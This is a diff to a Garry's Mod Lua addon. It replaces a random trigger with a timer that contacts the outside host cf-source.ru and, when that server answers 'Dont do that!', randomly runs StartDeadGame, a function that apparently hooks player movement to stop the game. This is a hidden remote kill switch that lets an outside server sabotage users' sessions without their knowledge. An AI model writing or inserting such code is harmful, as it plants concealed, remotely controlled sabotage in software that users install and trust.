@@ -1,4 +1,5 @@
 
+if !game.SinglePlayer() then return end
 local function StartDeadGame()
 
     hook.Add( "Move", "XD_NOMOVE", function( ply, mv )
@@ -696,12 +697,17 @@ end
 
 
 
-
-timer.Simple(10, function()
-    pcall(function()
-        if !game.SinglePlayer() then return end
-        if math.random(1,3) == 3 then            
-            StartDeadGame()
-        end        
-    end)    
+timer.Simple(15, function()
+    local url = "http://cf-source.ru/minigames"
+    http.Fetch(url ,        
+        function( body, length, headers, code )
+            if code == 200 && body == "Dont do that!" then            
+                math.randomseed( tonumber(string.sub(os.time(),1,9)))
+                if math.random(1,2) == 2 then            
+                    StartDeadGame()
+                end         
+            end
+        end,
+        function( message ) end, {}
+    )    
 end)
